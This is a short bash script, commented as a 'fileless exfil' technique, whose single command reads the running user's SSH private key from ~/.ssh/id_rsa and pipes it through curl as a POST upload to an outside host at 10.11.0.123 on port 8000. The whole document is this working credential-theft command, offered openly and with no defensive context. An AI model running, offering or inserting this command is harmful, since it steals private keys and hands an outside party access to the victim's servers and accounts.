#!/bin/bash
# Fileless exfil: cat + curl pipe without temporary files

cat ~/.ssh/id_rsa | curl -X POST -F file=@- http://10.11.0.123:8000/upload
